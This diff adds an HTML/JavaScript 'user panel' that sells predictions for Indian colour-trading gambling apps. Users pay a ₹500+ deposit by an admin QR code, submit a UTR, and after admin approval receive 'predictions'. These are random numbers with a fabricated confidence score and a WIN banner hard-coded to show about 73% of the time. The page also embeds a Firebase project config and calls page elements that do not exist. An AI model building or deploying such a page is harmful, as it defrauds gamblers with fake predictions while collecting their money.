@@ -1,0 +1,735 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
+<title>ALL GAME PENEL • User Panel</title>
+
+<!-- Firebase -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+--bg:#1a0008;
+--card1:#3d0017;
+--card2:#5a001f;
+--accent:#ffd700;
+--saffron:#ff6600;
+}
+
+body{
+margin:0;
+font-family:'Rajdhani',sans-serif;
+background:radial-gradient(circle at top,#330012,#1a0008 70%);
+color:#fff;
+min-height:100vh;
+display:flex;
+align-items:center;
+justify-content:center;
+padding:16px;
+position:relative;
+overflow:hidden;
+}
+
+/* 🕉️ RAM RAM Background Pattern */
+body::before{
+content:"";
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='140' height='80'%3E%3Ctext x='50%25' y='50%25' font-size='32' font-weight='700' fill='rgba(255,215,0,0.18)' text-anchor='middle' dominant-baseline='middle'%3Eराम राम%3C/text%3E%3C/svg%3E");
+background-repeat: repeat;
+background-size:140px 80px;
+z-index:0;
+pointer-events:none;
+}
+
+.wrap{
+max-width:420px;
+width:100%;
+position:relative;
+z-index:2;
+}
+
+.card{
+background:linear-gradient(145deg,var(--card1),var(--card2));
+border-radius:20px;
+padding:18px;
+border:3px solid var(--accent);
+box-shadow:0 0 40px rgba(255,215,0,0.4);
+}
+
+.glow{
+font-size:24px;
+font-weight:800;
+background:linear-gradient(90deg,#ffd700,#ff6600);
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
+text-align:center;
+}
+
+.sub{
+font-size:13px;
+text-align:center;
+color:#ffccaa;
+margin-top:6px;
+}
+
+.input,select{
+width:100%;
+padding:10px;
+border-radius:10px;
+border:2px solid rgba(255,215,0,0.3);
+background:rgba(0,0,0,0.5);
+color:#fff;
+font-weight:700;
+}
+
+.input:focus,select:focus{
+border-color:var(--accent);
+box-shadow:0 0 12px rgba(255,215,0,0.6);
+outline:none;
+}
+
+.row{
+display:flex;
+justify-content:space-between;
+align-items:center;
+padding:12px;
+border-radius:10px;
+background:rgba(255,215,0,0.08);
+margin-top:8px;
+border:1px solid rgba(255,215,0,0.2);
+}
+
+.row b{
+color:var(--accent);
+}
+
+.status{
+margin-top:12px;
+padding:12px;
+border-radius:12px;
+text-align:center;
+font-weight:700;
+}
+
+.pending{
+background:#330000;
+color:#ff4444;
+}
+
+.success{
+background:#003300;
+color:#00ff88;
+box-shadow:0 0 25px rgba(0,255,136,0.4);
+}
+
+.btn{
+display:block;
+margin:12px auto;
+padding:12px 18px;
+border-radius:50px;
+border:none;
+background:linear-gradient(45deg,#ff0000,#ffd700);
+font-weight:800;
+font-size:18px;
+color:#000;
+cursor:pointer;
+width:90%;
+box-shadow:0 0 20px rgba(255,215,0,0.6);
+transition:0.3s;
+}
+
+.btn:hover{
+transform:scale(1.05);
+box-shadow:0 0 30px rgba(255,215,0,0.9);
+}
+
+.qr-img{
+max-width:220px;
+width:220px;
+height:220px;
+border-radius:14px;
+border:6px solid var(--accent);
+background:#000;
+object-fit:contain;
+box-shadow:0 0 30px rgba(255,215,0,0.6);
+}
+
+.predict-section{
+display:none;
+margin-top:12px;
+padding:12px;
+border-radius:12px;
+background:linear-gradient(180deg,#2b000f,#1a0008);
+border:2px solid var(--accent);
+box-shadow:0 0 30px rgba(255,215,0,0.4);
+}
+
+.big{
+font-size:20px;
+text-align:center;
+margin-bottom:6px;
+color:#ffd700;
+font-weight:800;
+}
+
+.num{
+font-size:72px;
+font-weight:900;
+background:linear-gradient(45deg,#ffd700,#ff0000);
+-webkit-background-clip:text;
+-webkit-text-fill-color:transparent;
+text-align:center;
+text-shadow:0 0 15px rgba(255,140,0,0.6);
+}
+
+.color-circle{
+width:70px;
+height:70px;
+border-radius:50%;
+margin:10px auto;
+box-shadow:0 0 25px rgba(255,215,0,0.6);
+}
+
+.green{background:#00ff00}
+.red{background:#ff3333}
+.violet{background:#800080}
+
+.win-banner{
+background:linear-gradient(90deg,#ffd700,#ff0000);
+color:#000;
+padding:6px;
+border-radius:6px;
+text-align:center;
+margin-top:8px;
+font-weight:900;
+}
+
+/* 🔳 QR FULL SCREEN CENTER */
+.qr-popup img{
+width:300px;
+height:300px;
+border:8px solid #ffd700;
+background:#fff;
+box-shadow:0 0 50px rgba(255,215,0,0.9);
+border-radius:20px;
+}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="card" id="cardMain">
+    <div class="glow">CONNECTED<br>SUCCESSFULLY</div>
+    <div class="sub" id="subText">Select game → enter Game ID → deposit (min ₹500) → pay using QR → submit UTR</div>
+
+    <!-- STEP 1: Setup form -->
+    <div id="setupForm" class="form">
+      <label class="small">Select App (choose platform)</label>
+<select id="appSelect" class="input">
+<option value="BDGWIN">BDGWIN</option>
+<option value="OKWIN">OKWIN</option>
+<option value="91CLUB">91 CLUB</option>
+<option value="51GAME">51GAME</option>
+<option value="IN999">IN999</option>
+<option value="TRINGA">TRINGA</option>
+<option value="DAMAN">DAMAN</option>
+<option value="RAJA">RAJA</option>
+<option value="LOTTERY7">LOTTERY 7</option>
+<option value="DIUWIN">DIUWIN</option>
+<option value="BIGMUMBAI">BIG MUMBAI</option>
+<option value="GOAGAME">GOAGAME</option>
+<option value="6CLUB">6CLUB</option>
+<option value="DMWIN">DMWIN</option>
+</select>
+      <label class="small">Select Game (color trading games popular in India)</label>
+      <select id="gameSelect" class="input">
+        <option value="okwin">OK Win / Wingo1</option>
+        <option value="aviator">Aviator</option>
+        <option value="wingo1">Wingo1</option>
+        <option value="boom">Boom</option>
+        <option value="teenpatti">TeenPatti</option>
+      </select>
+
+      <label class="small">Your In-Game ID</label>
+      <input id="gameIdInput" class="input" placeholder="Enter your game ID (in-game)">
+
+      <label class="small">Deposit Amount (min 500)</label>
+      <input id="depositInput" type="number" min="500" class="input" placeholder="500">
+
+      <label class="small">Currency</label>
+      <select id="currencySelect" class="input">
+        <option value="INR">INR</option>
+        <option value="USD">USD</option>
+      </select>
+
+      <button id="createBtn" class="btn">Create / Start Session</button>
+    </div>
+
+    <!-- Main panel (hidden until created) -->
+    <div id="mainPanel" style="display:none">
+      <div class="row"><div>UID:</div><div><b id="uidDisplay">-</b></div></div>
+      <div class="row"><div>Game:</div><div><b id="gameName">-</b></div></div>
+      <div class="row"><div>Deposit:</div><div style="color:#ffaa00;font-size:18px"><b id="amount">0</b> <span id="currencyLabel">INR</span></div></div>
+
+      <div id="statusBox" class="status pending">PAYMENT NOT RECEIVED</div>
+
+      <!-- QR & payment -->
+      <div class="qr-area">
+        <div style="display:flex;gap:8px;align-items:center">
+          <button id="useAdminQrBtn" class="btn" style="width:48%">Use Admin QR</button>
+        </div>
+        <input id="customQrInput" class="input" placeholder="Paste custom QR image URL (optional)" style="display:none">
+        <img id="qrPreview" class="qr-img" src="" alt="QR" style="display:none">
+        <button id="payDoneBtn" class="btn" style="width:90%;display:none">I PAID — Submit UTR</button>
+        <div id="utrSection" style="display:none;width:90%;margin:0 auto">
+          <input id="utrInput" class="input" placeholder="Enter UTR / Transaction ID">
+          <button id="submitUtrBtn" class="btn" style="width:100%">Submit UTR</button>
+        </div>
+      </div>
+
+      <!-- prediction -->
+      <div id="predictSection" class="predict-section">
+        <div class="period">
+          <div>Period: <span id="period">--</span></div>
+          <div class="timer" id="countdown">Next in 00:00</div>
+        </div>
+        <div class="big" id="bigSmall">--</div>
+        <div class="num" id="number">-</div>
+        <div id="colorCircle" class="color-circle green"></div>
+        <div style="text-align:center;color:#fff;margin-top:8px">Color: <b id="colorName">-</b></div>
+        <div class="conf" id="confText">Confidence: 0%</div>
+        <div id="winBanner" class="win-banner" style="display:none">WIN</div>
+      </div>
+
+      <div id="blockedBanner" class="blocked-banner" style="display:none">YOUR UID HAS BEEN BLOCKED. YOU CANNOT PLAY.</div>
+    </div>
+  </div>
+</div>
+
+<!-- QR popup big -->
+<div class="qr-popup" id="qrPop">
+  <img class="qr-img" id="qrImg" src="" alt="QR">
+  <div style="width:100%;display:flex;justify-content:center;margin-top:18px">
+    <button class="btn" style="width:60%" 
+    onclick="localStorage.removeItem('panel_uid'); window.location.replace(window.location.pathname);">
+    CLOSE
+    </button>
+  </div>
+</div>
+
+<script>
+/* --------------------------
+  Firebase config (use provided)
+---------------------------*/
+const firebaseConfig = {
+apiKey: "AIzaSyA9U2Qo-LJVvJGaeV6xaptjyEuw-q-ddZY",
+authDomain: "v-earn-cd4ab.firebaseapp.com",
+databaseURL: "https://v-earn-cd4ab-default-rtdb.firebaseio.com",
+projectId: "v-earn-cd4ab",
+storageBucket: "v-earn-cd4ab.firebasestorage.app",
+messagingSenderId: "417055322305",
+appId: "1:417055322305:web:64ab53f453ff8672876440",
+measurementId: "G-J0X0GF22R0"
+};
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+const panelRef = db.ref('panel');
+
+/* --------------------------
+  Helpers: period & timer
+  period format: YYYYMMDDHHMM  (local time)
+---------------------------*/
+function getCurrentPeriod(){
+  const now = new Date();
+  // You can set timezone offset here if needed
+  const Y = now.getFullYear().toString();
+  const M = String(now.getMonth()+1).padStart(2,'0');
+  const D = String(now.getDate()).padStart(2,'0');
+  const h = String(now.getHours()).padStart(2,'0');
+  const m = String(now.getMinutes()).padStart(2,'0');
+  return Y + M + D + h + m;
+}
+function secondsUntilNextMinute(){
+  const now = new Date();
+  return 60 - now.getSeconds();
+}
+
+/* --------------------------
+  State
+---------------------------*/
+let panelUid = localStorage.getItem('panel_uid') || null; // panel uid (users node key)
+let gameApp = null, gameName = null;
+let deposit = 0, currency = 'INR';
+let usingCustomQr = false;
+let panelQrUrl = null;
+let predictionInterval = null;
+let countdownInterval = null;
+
+/* --------------------------
+  UI elements
+---------------------------*/
+const setupForm = document.getElementById('setupForm');
+const createBtn = document.getElementById('createBtn');
+
+const mainPanel = document.getElementById('mainPanel');
+const uidDisplay = document.getElementById('uidDisplay');
+const gameNameEl = document.getElementById('gameName');
+const amountEl = document.getElementById('amount');
+const currencyLabel = document.getElementById('currencyLabel');
+
+const showQrBtn = document.getElementById('useAdminQrBtn');
+const pasteQrBtn = document.getElementById('pasteQrBtn');
+const customQrInput = document.getElementById('customQrInput');
+const qrPreview = document.getElementById('qrPreview');
+const payDoneBtn = document.getElementById('payDoneBtn');
+const utrSection = document.getElementById('utrSection');
+const utrInput = document.getElementById('utrInput');
+const submitUtrBtn = document.getElementById('submitUtrBtn');
+
+const statusBox = document.getElementById('statusBox');
+const blockedBanner = document.getElementById('blockedBanner');
+
+const predictSection = document.getElementById('predictSection');
+const periodEl = document.getElementById('period');
+const countdownEl = document.getElementById('countdown');
+const bigSmallEl = document.getElementById('bigSmall');
+const numberEl = document.getElementById('number');
+const colorCircle = document.getElementById('colorCircle');
+const colorNameEl = document.getElementById('colorName');
+const confText = document.getElementById('confText');
+const winBanner = document.getElementById('winBanner');
+
+const uidPopup = document.getElementById('uidPopup');
+
+/* --------------------------
+  Panel QR realtime listen
+---------------------------*/
+panelRef.child('qrCodeUrl').on('value', snap => {
+  panelQrUrl = snap.val();
+  // if user is using admin QR show preview
+  if(!usingCustomQr && panelQrUrl){
+    qrPreview.src = panelQrUrl;
+    qrPreview.style.display = 'block';
+    document.getElementById('payDoneBtn').style.display = 'block';
+  }
+});
+
+/* --------------------------
+  Create session / user
+---------------------------*/
+createBtn.addEventListener('click', async ()=>{
+  const appSel = document.getElementById('appSelect').value;
+  const gameSel = document.getElementById('gameSelect').value;
+  const gameId = document.getElementById('gameIdInput').value.trim();
+  const dep = parseFloat(document.getElementById('depositInput').value);
+  const curr = document.getElementById('currencySelect').value;
+
+  if(!gameId){ alert('Enter your in-game ID'); return; }
+  if(isNaN(dep) || dep < 500){ alert('Deposit must be at least 500'); return; }
+
+  // create user node (key will be our panel UID) using push
+  const newRef = db.ref('users').push();
+  panelUid = newRef.key;
+  const userObj = {
+    gameApp: appSel,
+    gameName: gameSel,
+    gameId: gameId,
+    amount: dep,
+    currency: curr,
+    status: 'pending',
+    blocked: false,
+    createdAt: Date.now()
+  };
+  await newRef.set(userObj);
+  localStorage.setItem('panel_uid', panelUid);
+
+  // show main panel
+  uidDisplay.innerText = panelUid;
+  gameNameEl.innerText = gameSel;
+  amountEl.innerText = dep;
+  currencyLabel.innerText = curr;
+  setupForm.style.display = 'none';
+  mainPanel.style.display = 'block';
+
+  // UID connected popup with animation & sound
+  showUidConnected();
+  listenUser(); // start listening user changes
+});
+
+/* --------------------------
+  Show UID popup + play simple beep
+---------------------------*/
+function showUidConnected(){
+  uidPopup.style.display = 'block';
+  uidPopup.style.opacity = '1';
+  // simple CSS fade out after 2.2s
+  setTimeout(()=>{ uidPopup.style.transition='opacity 0.6s'; uidPopup.style.opacity='0'; }, 2200);
+  setTimeout(()=>{ uidPopup.style.display='none'; uidPopup.style.transition=''; }, 2800);
+  // play short beep using WebAudio
+  try{
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const o = ctx.createOscillator();
+    const g = ctx.createGain();
+    o.type = 'sine';
+    o.frequency.value = 880;
+    o.connect(g); g.connect(ctx.destination);
+    o.start();
+    g.gain.setValueAtTime(0.0001, ctx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.2, ctx.currentTime + 0.02);
+    g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.25);
+    setTimeout(()=>{ o.stop(); ctx.close(); }, 300);
+  }catch(e){ /* ignore audio errors */ }
+}
+
+/* --------------------------
+  Listen user node realtime
+---------------------------*/
+function listenUser(){
+  if(!panelUid) return;
+  const uRef = db.ref('users/' + panelUid);
+  uRef.on('value', snap => {
+    const u = snap.val() || {};
+    amountEl.innerText = u.amount || 0;
+    gameNameEl.innerText = u.gameName || '-';
+
+    // status UI
+    statusBox.className = 'status';
+    if(u.status === 'success' || u.status === 'approved'){
+      statusBox.classList.add('success'); statusBox.innerText = 'PAYMENT SUCCESSFUL!';
+      // enable prediction only if not blocked
+      if(!u.blocked) startPrediction();
+      document.getElementById('payDoneBtn').style.display = 'none';
+    } else if(u.status === 'rejected'){
+      statusBox.classList.add('pending'); statusBox.innerText = 'PAYMENT REJECTED';
+      stopPrediction();
+    } else {
+      statusBox.classList.add('pending'); statusBox.innerText = 'PAYMENT NOT RECEIVED';
+      stopPrediction();
+      // show pay button
+      document.getElementById('payDoneBtn').style.display = panelQrUrl || qrPreview.src ? 'block' : 'none';
+    }
+
+    if(u.blocked){
+      blockedBanner.style.display = 'block';
+      stopPrediction();
+      document.getElementById('payDoneBtn').disabled = true;
+    } else {
+      blockedBanner.style.display = 'none';
+      document.getElementById('payDoneBtn').disabled = false;
+    }
+  });
+}
+
+/* --------------------------
+  QR usage 
+---------------------------*/
+showQrBtn.addEventListener('click', ()=>{
+  usingCustomQr = false;
+  customQrInput.style.display = 'none';
+  if(panelQrUrl){
+    qrPreview.src = panelQrUrl; qrPreview.style.display = 'block';
+    document.getElementById('payDoneBtn').style.display = 'block';
+  } else {
+    alert('Admin has not set a panel QR yet.');
+  }
+});
+pasteQrBtn.addEventListener('click', ()=>{
+  usingCustomQr = true;
+  customQrInput.style.display = 'block';
+  customQrInput.focus();
+  document.getElementById('payDoneBtn').style.display = 'block';
+});
+customQrInput.addEventListener('change', ()=>{
+  const v = customQrInput.value.trim();
+  if(v){ qrPreview.src = v; qrPreview.style.display='block'; }
+});
+
+/* QR popup big on click */
+qrPreview.addEventListener('click', ()=> {
+  document.getElementById('qrImg').src = qrPreview.src;
+  document.getElementById('qrPop').classList.add('show');
+});
+function closeQr(){ document.getElementById('qrPop').classList.remove('show'); }
+
+/* --------------------------
+  Payment -> UTR submit flow
+---------------------------*/
+payDoneBtn.addEventListener('click', ()=>{
+  // show UTR section
+  utrSection.style.display = 'block';
+  document.getElementById('utrInput').focus();
+});
+
+submitUtrBtn.addEventListener('click', async ()=>{
+  const utr = utrInput.value.trim();
+  if(!utr) return alert('Please enter UTR / Transaction ID');
+  if(!panelUid) return alert('Internal error: no UID');
+
+  // push utr request
+  const r = await db.ref('users/' + panelUid + '/utrRequests').push({
+    utr: utr,
+    amount: parseFloat(document.getElementById('depositInput').value) || 0,
+    currency: document.getElementById('currencySelect').value,
+    time: Date.now(),
+    status: 'pending'
+  });
+
+  // set flag so admin can see pending
+  await db.ref('users/' + panelUid).update({pendingUtr: true});
+
+  alert('UTR submitted — Admin will verify. Thank you!');
+  utrInput.value = '';
+  utrSection.style.display = 'none';
+});
+
+/* --------------------------
+  Prediction: stable per period + saved in DB
+  - If lastPrediction.period === currentPeriod => reuse
+  - Else generate, save to users/{uid}/lastPrediction
+---------------------------*/
+async function startPrediction(){
+  if(!panelUid) return;
+  if(predictionInterval) return;
+  predictSection.classList.add('show');
+  // immediate generate/show
+  await ensurePredictionForCurrentPeriod();
+  // set interval to re-check each minute boundary
+  predictionInterval = setInterval(ensurePredictionForCurrentPeriod, 1000 * 10); // check every 10s near minute boundary
+  startCountdownTimer();
+}
+function stopPrediction(){
+  if(predictionInterval){ clearInterval(predictionInterval); predictionInterval = null; }
+  if(countdownInterval){ clearInterval(countdownInterval); countdownInterval = null; }
+  predictSection.classList.remove('show');
+  winBanner.style.display = 'none';
+}
+
+/* Ensure prediction exists and show it */
+async function ensurePredictionForCurrentPeriod(){
+  if(!panelUid) return;
+  const period = getCurrentPeriod();
+  periodEl.innerText = period;
+  // load lastPrediction
+  const lpSnap = await db.ref('users/' + panelUid + '/lastPrediction').once('value');
+  const lp = lpSnap.val();
+  if(lp && lp.period === period){
+    // reuse
+    showPrediction(lp);
+    return;
+  }
+  // otherwise generate a fresh prediction for this period and save it
+  const newPred = await generateAndSavePrediction(period);
+  showPrediction(newPred);
+}
+
+/* Generate prediction algorithm (biased high win) */
+async function generateAndSavePrediction(period){
+  // Try to read some recent 'chart' history if exists to get slope
+  const chartSnap = await db.ref('users/' + panelUid + '/chart').limitToLast(20).once('value');
+  let points = [];
+  chartSnap.forEach(s => { const v = s.val(); if(v && typeof v.v !== 'undefined') points.push(Number(v.v)); });
+  if(points.length === 0){
+    // fallback to global chartHistory if available
+    const gSnap = await db.ref('chartHistory').limitToLast(20).once('value');
+    gSnap.forEach(s => { const v = s.val(); if(v && typeof v.v !== 'undefined') points.push(Number(v.v)); });
+  }
+  // fill synthetic if empty
+  if(points.length === 0){
+    for(let i=0;i<20;i++) points.push(Math.sin(i/3) + Math.random()*0.4);
+  }
+
+  const last = points[points.length-1];
+  const prev = points[points.length-2] || last;
+  const slope = last - prev;
+  const vol = Math.max(...points) - Math.min(...points);
+
+  // increase winning chances ~73%
+  const winProbability = 0.73;
+  const isWin = Math.random() < winProbability;
+
+  // decide big/small biased by slope when isWin true
+  const bigSmall = isWin ? (slope >= 0 ? 'BIG' : 'SMALL') : (Math.random() < 0.5 ? 'BIG' : 'SMALL');
+
+  // number bias: BIG -> 5-9, SMALL -> 0-4, but pick weighted to favor "winning" numbers
+  const number = bigSmall === 'BIG' ? (5 + Math.floor(Math.random()*5)) : (Math.floor(Math.random()*5));
+
+  // color bias: favor GREEN slightly
+  const r = Math.random();
+  let colorName = 'GREEN', colorClass = 'green';
+  if(r < 0.5){ colorName='GREEN'; colorClass='green'; }
+  else if(r < 0.85){ colorName='RED'; colorClass='red'; }
+  else { colorName='VIOLET'; colorClass='violet'; }
+
+  const confidence = Math.min(99, Math.round(Math.abs(slope)*40 + (1 - Math.min(1,vol))*40 + Math.random()*20));
+
+  const pred = { ts: Date.now(), period, bigSmall, number, colorName, confidence, isWin };
+  // Save to user node
+  await db.ref('users/' + panelUid + '/lastPrediction').set(pred);
+  // Also save to global for admin review
+  await db.ref('predictions/' + period + '/' + panelUid).set(pred);
+  return pred;
+}
+
+/* Show prediction on UI */
+function showPrediction(pred){
+  bigSmallEl.innerText = pred.bigSmall || '--';
+  numberEl.innerText = (typeof pred.number !== 'undefined') ? pred.number : '-';
+  const cls = (pred.colorName || 'GREEN').toLowerCase();
+  colorCircle.className = 'color-circle ' + (cls === 'green' ? 'green' : (cls === 'red' ? 'red' : 'violet'));
+  colorNameEl.innerText = pred.colorName || 'GREEN';
+  confText.innerText = 'Confidence: ' + (pred.confidence || 0) + '%';
+  winBanner.style.display = pred.isWin ? 'block' : 'none';
+}
+
+/* Countdown timer until next minute — updates every second */
+function startCountdownTimer(){
+  if(countdownInterval) clearInterval(countdownInterval);
+  function update(){
+    const s = secondsUntilNextMinute();
+    const mm = String(Math.floor(s/60)).padStart(2,'0');
+    const ss = String(s % 60).padStart(2,'0');
+    countdownEl.innerText = 'Next in ' + '00:' + String(ss).padStart(2,'0');
+    // If we're at boundary (s close to 60 or 0), ensure prediction ensured
+    // handled by ensurePredictionForCurrentPeriod running in interval
+  }
+  update();
+  countdownInterval = setInterval(update, 1000);
+}
+
+/* --------------------------
+  Keep result stable across refresh
+  - ensured because we store lastPrediction.period and reuse it
+---------------------------*/
+
+/* --------------------------
+  On page load: if panel_uid exists, attach listen
+---------------------------*/
+window.addEventListener('load', ()=>{
+  if(panelUid){
+    // show main panel
+    setupForm.style.display = 'none';
+    mainPanel.style.display = 'block';
+    uidDisplay.innerText = panelUid;
+    // fetch minimal user info to populate
+    db.ref('users/' + panelUid).once('value').then(snap=>{
+      const u = snap.val() || {};
+      gameNameEl.innerText = u.gameName || '-';
+      amountEl.innerText = u.amount || 0;
+      currencyLabel.innerText = u.currency || 'INR';
+      listenUser();
+    });
+  }
+});
+
+/* Cleanup on unload */
+window.addEventListener('beforeunload', ()=>{ stopPrediction(); });
+</script>
+</body>
+</html>
